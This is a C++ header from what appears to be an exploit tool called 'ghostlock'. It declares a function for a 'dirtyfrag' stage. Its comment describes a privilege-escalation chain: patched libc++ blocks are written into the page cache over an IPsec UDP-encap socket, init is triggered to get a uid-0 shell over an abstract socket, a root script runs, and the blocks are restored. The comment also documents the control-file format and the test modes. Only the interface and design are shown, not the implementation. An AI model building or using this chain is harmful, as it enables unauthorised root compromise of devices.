#ifndef GHOSTLOCK_DIRTYFRAG_STAGE_HPP
#define GHOSTLOCK_DIRTYFRAG_STAGE_HPP

namespace ghostlock::session {
    /* Second way, phases B, C, E and F of the hybrid design: send the patched
     * libc++ blocks (the app computes every IV), trigger init through an orphan
     * reap, connect to the init stub's abstract socket, run the existing root
     * script over that uid-0 shell, and restore the page-cache blocks.
     *
     * The control file is line based:
     *   lib <path>
     *   sender <port>            (the transform's remote port)
     *   encap <port>             (the IpSecManager UDP-encap socket port)
     *   spi <decimal>
     *   socket <name>            (abstract socket name, matches the stub blob)
     *   patch <offset> <iv32hex>
     *   restore <offset> <iv32hex>
     *
     * `mode` is a diagnostic test hook (the app reads it from a debug file):
     *   "full"    - trigger init, run the root script (the product path);
     *   "noshell" - patch, read back and restore only (the primitive alone);
     *   "noscript"- trigger init, verify uid=0, restore, but run no script;
     *   "laterestore" - the old behaviour: run the root script first and
     *                   restore after it (the A/B control).
     * The page-cache restore runs as soon as the stub is no longer needed
     * (after the shell id, or immediately in "noshell"), not after the script.
     *
     * Returns 0 only when the requested phases completed and every restore was
     * sent and read back. */
    int run_dirtyfrag_stage(const char *control_path, const char *mode);
} // namespace ghostlock::session

#endif
